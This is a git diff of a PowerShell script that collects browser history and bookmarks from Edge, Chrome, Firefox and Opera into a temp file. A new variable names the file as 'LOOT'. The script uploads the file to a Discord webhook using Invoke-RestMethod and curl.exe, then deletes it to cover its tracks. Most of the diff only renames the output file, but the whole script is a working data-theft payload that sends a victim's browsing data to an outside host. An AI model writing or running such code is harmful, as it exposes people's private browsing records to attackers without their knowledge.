@@ -1,3 +1,5 @@
+$FileName = "$env:tmp/$env:USERNAME-LOOT-browsers-$(get-date -f yyyy-MM-dd_hh-mm).txt"
+
 function Get-BrowserData {
 
     [CmdletBinding()]
@@ -32,20 +34,22 @@ function Get-BrowserData {
     } 
 }
 
-Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\--BrowserData.txt
+Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\BrowserData.txt
 
-Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt
+Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\BrowserData.txt
 
-Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\--BrowserData.txt
+Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\BrowserData.txt
 
-Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt
+Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP\BrowserData.txt
 
-Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\--BrowserData.txt
+Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\BrowserData.txt
 
-Get-BrowserData -Browser "opera" -DataType "history" >> $env:TMP\--BrowserData.txt
+Get-BrowserData -Browser "opera" -DataType "history" >> $env:TMP\BrowserData.txt
 
-Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt
+Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\BrowserData.txt
 #------------------------------------------------------------------------------------------------------------------------------------
+
+
 
 function Upload-Discord {
 
@@ -70,8 +74,8 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\--BrowserData.txt}
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\BrowserData.txt}
 
 
 ############################################################################################################################################################
-RI $env:TEMP\--BrowserData.txt
+RI $env:TEMP\BrowserData.txt
